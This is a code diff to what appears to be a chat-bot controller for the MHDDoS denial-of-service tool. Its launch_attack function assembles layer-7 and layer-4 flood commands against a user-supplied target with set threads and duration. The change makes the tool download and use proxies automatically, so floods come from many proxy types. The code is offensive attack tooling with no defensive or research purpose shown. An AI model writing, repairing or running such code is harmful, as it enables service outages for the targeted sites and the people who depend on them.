@@ -443,19 +443,13 @@ def launch_attack(chat_id, state):
     threads = str(state['threads'])
     duration = str(state['duration'])
     
-    # Ensure proxy file exists to prevent script exit
-    if not os.path.exists("files/proxies/proxy.txt"):
-        try:
-             os.makedirs("files/proxies", exist_ok=True)
-             with open("files/proxies/proxy.txt", "w") as f:
-                 f.write("\n")
-        except:
-            pass
+    # We removed the empty proxy file creation logic so MHDDoS can auto-download proxies.
+    proxy_type = "0" # 0 = All proxy types from config.json
 
     cmd = []
     if layer == 7:
         # L7: sys.executable start.py <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration>
-        cmd = [sys.executable, MHDDOS_SCRIPT, method, target, "1", threads, "proxy.txt", "100", duration]
+        cmd = [sys.executable, MHDDOS_SCRIPT, method, target, proxy_type, threads, "proxy.txt", "100", duration]
     else:
         # L4: python start.py <method> <ip:port> <threads> <duration>
         # Strip https:// if passed for L4
